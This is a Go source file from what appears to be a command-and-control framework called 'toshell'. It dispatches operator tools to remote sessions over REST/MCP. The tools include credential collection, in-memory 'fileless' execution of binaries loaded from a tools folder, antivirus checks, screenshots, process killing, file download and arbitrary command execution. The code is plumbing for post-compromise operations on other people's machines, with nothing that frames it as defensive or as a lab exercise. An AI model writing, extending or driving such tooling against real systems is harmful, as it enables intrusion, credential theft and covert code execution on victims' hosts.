package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strconv"

	"toshell/internal/common/types"
	"toshell/internal/server/task"
)

// ─── 「工具 → 内部任务」的单一映射（v1.4.0 S2）──────────────────────────
//
// 改造前这段知识散落在 invokeTool 的 7 个 case 里（各自写死 60/90/180/300/120），
// 于是同一个工具的"预估超时"没有任何地方能回答——而长任务挂起判定恰恰需要它在**下发前**
// 就知道"这个工具大概要跑多久"。这里把它收敛成一处：超时表 + 一个纯查询函数
// （toolTaskTimeout）+ 一个创建函数（planToolTask），同步路径、长任务判定、挂起恢复
// 三方共用，杜绝"判定用一套值、创建用另一套值"的漂移。

// 工具内部任务的等待超时（秒）。语义与历史实现逐字一致（不改行为，只做收敛）：
//   - file_list/process_list/process_kill 60s：轻量枚举；
//   - screenshot 90s：截图要采集+编码，比枚举慢；
//   - credentials/fileless_exec/plugin_load 180s：凭据收集与模块加载是"分钟级"操作；
//   - file_download 300s：大文件传输，给足时间；
//   - exec/run_command/语义命令 120s：默认给"秒级命令 + 安全余量"，可由调用方 timeout_sec 覆盖。
const (
	toolTimeoutFileList     = 60
	toolTimeoutProcessList  = 60
	toolTimeoutProcessKill  = 60
	toolTimeoutScreenshot   = 90
	toolTimeoutCredentials  = 180
	toolTimeoutFilelessExec = 180
	toolTimeoutPluginLoad   = 180
	toolTimeoutFileDownload = 300
	toolTimeoutExecDefault  = 120
)

// 等待时长的统一上下限（此前 pushAndAwait/execAndAwait 各自写死 60/300）：
//   - taskWaitDefaultSec 调用方没给超时（<=0）时的默认等待；
//   - taskWaitMaxSec 单次等待的硬上限（防止一次 REST 调用挂掉几十分钟）。
const (
	taskWaitDefaultSec = 60
	taskWaitMaxSec     = 300
)

// clampToolWait 归一化等待时长：<=0 取默认 60，>300 截到 300。
// 与改造前 pushAndAwait/execAndAwait 的 clamp 完全一致。
func clampToolWait(sec int) int {
	if sec <= 0 {
		return taskWaitDefaultSec
	}
	if sec > taskWaitMaxSec {
		return taskWaitMaxSec
	}
	return sec
}

// taskToolNames 会产生内部任务、可被等待的工具（与 invokeTool 的分支一一对应）。
// 单独列出来是为了让"哪些工具是任务类"这件事可被断言（见工具超时表的单测）。
var taskToolNames = []string{
	"exec", "run_command", "user_info", "system_info", "service_list",
	"check_av", "net_info", "net_connections", "env_vars", "scheduled_tasks",
	"file_list", "file_download", "process_list", "process_kill",
	"screenshot", "credentials", "fileless_exec", "plugin_load",
}

// toolTaskTimeout 返回该工具内部任务的**预估超时（秒）**；isTask=false 表示它不是任务类工具。
//
// 纯查询、无副作用：长任务挂起判定会在**真正下发之前**调用它，因此绝不能在这里创建任务
// 或读文件（旧想法是把 planToolTask 当查询用，那会为每次工具调用凭空造一个任务）。
func (s *Server) toolTaskTimeout(name string, params map[string]string) (int, bool) {
	switch name {
	case "file_list":
		return toolTimeoutFileList, true
	case "process_list":
		return toolTimeoutProcessList, true
	case "process_kill":
		return toolTimeoutProcessKill, true
	case "screenshot":
		return toolTimeoutScreenshot, true
	case "credentials":
		return toolTimeoutCredentials, true
	case "fileless_exec":
		return toolTimeoutFilelessExec, true
	case "plugin_load":
		return toolTimeoutPluginLoad, true
	case "file_download":
		return toolTimeoutFileDownload, true
	case "exec", "run_command", "user_info", "system_info", "service_list",
		"check_av", "net_info", "net_connections", "env_vars", "scheduled_tasks":
		timeout := toolTimeoutExecDefault
		if params != nil {
			if sec, perr := strconv.Atoi(params["timeout_sec"]); perr == nil && sec > 0 {
				timeout = sec
			}
		}
		return clampToolWait(timeout), true
	}
	return 0, false
}

// toolTaskPlan 一次"会产生内部任务"的工具调用方案。
type toolTaskPlan struct {
	// Task 已创建（尚未下发）的内部任务。
	Task *types.TaskInfo
	// TimeoutSec 该工具的等待超时（已 clamp）。
	TimeoutSec int
}

// planToolTask 把工具名 + 参数映射为内部任务（同步路径与长任务挂起路径**唯一的创建入口**）。
//
// ok=false 表示该工具不产生内部任务（只读/本地工具），调用方应走同步 InvokeTool。
// 参数校验与错误文案与改造前的各 case 逐字一致——对外错误信息也是契约的一部分。
func (s *Server) planToolTask(name string, params map[string]string) (toolTaskPlan, bool, error) {
	timeout, isTask := s.toolTaskTimeout(name, params)
	if !isTask {
		return toolTaskPlan{}, false, nil
	}
	if params == nil {
		params = map[string]string{}
	}
	sid := params["session_id"]

	switch name {
	case "file_list":
		if sid == "" || params["path"] == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id and path required")
		}
		t, err := s.taskMgr.CreateFileList(sid, params["path"])
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "file_download":
		if sid == "" || params["path"] == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id and path required")
		}
		t, err := s.taskMgr.CreateFileDownload(sid, params["path"])
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "process_list":
		if sid == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id required")
		}
		t, err := s.taskMgr.CreateProcessList(sid)
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "process_kill":
		pid, perr := strconv.ParseUint(params["pid"], 10, 32)
		if sid == "" || perr != nil {
			return toolTaskPlan{}, true, fmt.Errorf("session_id and pid required")
		}
		t, err := s.taskMgr.CreateProcessKill(sid, uint32(pid))
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "screenshot":
		if sid == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id required")
		}
		t, err := s.taskMgr.Create(sid, task.TaskParams{TaskType: task.TaskTypeScreenshot})
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "credentials":
		if sid == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id required")
		}
		action := params["action"]
		if action == "" {
			action = "all"
		}
		credData, _ := json.Marshal(map[string]string{"action": action})
		t, err := s.taskMgr.Create(sid, task.TaskParams{TaskType: "credentials", Data: string(credData)})
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "fileless_exec":
		src := params["source"]
		if sid == "" || src == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id and source (file in data/tools) required")
		}
		kind := params["kind"]
		if kind == "" {
			kind = guessToolKind(src)
		}
		toolPath, terr := resolveToolPath(src)
		if terr != nil {
			return toolTaskPlan{}, true, terr
		}
		data, rerr := os.ReadFile(toolPath)
		if rerr != nil {
			return toolTaskPlan{}, true, fmt.Errorf("read tool failed: %w", rerr)
		}
		// exe/exe_mem：args 会作为被内存执行程序的命令行参数注入
		waitMs := 0
		if v := params["wait_ms"]; v != "" {
			if n, aerr := strconv.Atoi(v); aerr == nil {
				waitMs = n
			}
		}
		t, cerr := s.taskMgr.CreateFilelessExec(sid, kind, base64.StdEncoding.EncodeToString(data), params["args"], params["entry"], waitMs)
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, cerr
	case "plugin_load":
		pid := params["plugin_id"]
		if sid == "" || pid == "" {
			return toolTaskPlan{}, true, fmt.Errorf("session_id and plugin_id required")
		}
		t, _, err := s.createPluginTask(sid, pid, params["args"])
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	case "exec", "run_command", "user_info", "system_info", "service_list",
		"check_av", "net_info", "net_connections", "env_vars", "scheduled_tasks":
		var cmd string
		if name == "exec" {
			cmd = params["command"]
			if cmd == "" {
				// 允许用内置语义命令（如 exec 带 kind=user_info）
				cmd = builtinCommand(params["kind"], params["command"])
			}
			if sid == "" || cmd == "" {
				return toolTaskPlan{}, true, fmt.Errorf("exec: session_id and command (or kind) required")
			}
		} else {
			cmd = builtinCommand(name, params["command"])
			if sid == "" {
				return toolTaskPlan{}, true, fmt.Errorf("session_id required")
			}
			if cmd == "" {
				return toolTaskPlan{}, true, fmt.Errorf("empty command for %s", name)
			}
		}
		t, err := s.taskMgr.CreateCommand(sid, cmd, nil, uint32(timeout))
		return toolTaskPlan{Task: t, TimeoutSec: timeout}, true, err
	}
	return toolTaskPlan{}, false, nil
}

// invokeTaskToolSync 同步执行一个任务类工具：创建任务 → 下发 → 事件驱动等待结果。
// 这是 REST/MCP 的**对外语义**：一次调用返回最终结果（不改契约，改的只是内部等待方式）。
func (s *Server) invokeTaskToolSync(name string, params map[string]string) (map[string]interface{}, error) {
	plan, ok, err := s.planToolTask(name, params)
	if !ok {
		return nil, fmt.Errorf("unknown tool: %s", name)
	}
	if err != nil {
		return nil, err
	}
	return s.pushAndAwait(params["session_id"], plan.Task, plan.TimeoutSec)
}
